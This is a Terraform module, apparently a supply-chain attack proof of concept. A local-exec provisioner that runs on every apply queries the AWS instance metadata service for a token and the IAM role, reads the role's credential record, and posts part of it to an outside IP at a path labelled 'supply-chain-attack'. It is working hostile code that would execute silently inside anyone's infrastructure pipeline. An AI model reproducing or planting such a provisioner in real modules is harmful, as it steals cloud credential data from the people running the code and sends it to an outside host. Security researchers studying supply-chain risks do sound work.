terraform {
  required_version = ">= 1.3.0"
}

variable "run_label" {
  type    = string
  default = "poc"
}

resource "null_resource" "egress_signal" {
  triggers = {
    run_label = var.run_label
    always    = timestamp()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<-EOT
      echo "[POC] Running module from remote source"
      TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
      ROLE=`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials`
      
      if [ -z "$ROLE" ]; then
        RESULT="no role found"
      else
        RESULT=`curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
          | grep -o '"Expiration"[^,}]*'`
      fi


      curl -X POST "http://34.238.194.120/supply-chain-attack" -H "Content-Type: application/json" -d $RESULT


   

      echo "[POC] Done"
    EOT
  }
}